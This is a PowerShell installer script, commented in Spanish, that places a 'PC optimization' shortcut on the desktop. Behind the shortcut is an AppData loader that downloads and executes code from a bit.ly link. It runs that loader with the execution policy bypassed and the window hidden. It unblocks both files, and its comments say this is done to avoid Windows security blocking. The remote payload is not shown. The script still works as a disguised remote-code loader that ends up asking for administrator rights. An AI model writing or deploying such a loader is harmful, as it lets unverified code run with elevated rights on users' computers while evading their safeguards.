# Script para crear el acceso directo al mantenimiento remoto
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName PresentationFramework

$Desktop = [System.Environment]::GetFolderPath('Desktop')
$ShortcutPath = Join-Path $Desktop "Optimizar PC - Antony Dapier.lnk" # Nombre del acceso directo

# Si ya existe, lo borramos para evitar conflictos de permisos
if (Test-Path $ShortcutPath) { Remove-Item $ShortcutPath -Force }

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)

# Creamos un script cargador local en AppData para que Windows no bloquee el acceso directo
$appFolder = Join-Path $env:APPDATA "AntonyDapier"
if (-not (Test-Path $appFolder)) { New-Item -ItemType Directory -Path $appFolder -Force | Out-Null }
$loaderPath = Join-Path $appFolder "mantenimiento_v10.ps1"
'iex (irm https://bit.ly/mandia-windows)' | Set-Content -Path $loaderPath -Force

# El acceso directo ahora apunta a un archivo local, lo cual evita el bloqueo de seguridad
$Shortcut.TargetPath = "$PSHOME\powershell.exe"
$Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$loaderPath"""

$Shortcut.IconLocation = "shell32.dll,70" # Icono de sistema para mantenimiento
$Shortcut.Description = "Mantenimiento y Optimización Antony Dapier"
$Shortcut.Save()

Unblock-File -Path $ShortcutPath -ErrorAction SilentlyContinue
Unblock-File -Path $loaderPath -ErrorAction SilentlyContinue

[System.Windows.MessageBox]::Show("¡Instalación completada con éxito!`n`nSe ha creado el acceso directo en tu escritorio. Al abrirlo, el sistema cargará tu herramienta y solicitará permisos de administrador.", "Antony Dapier - Mantenimiento", "OK", "Information")
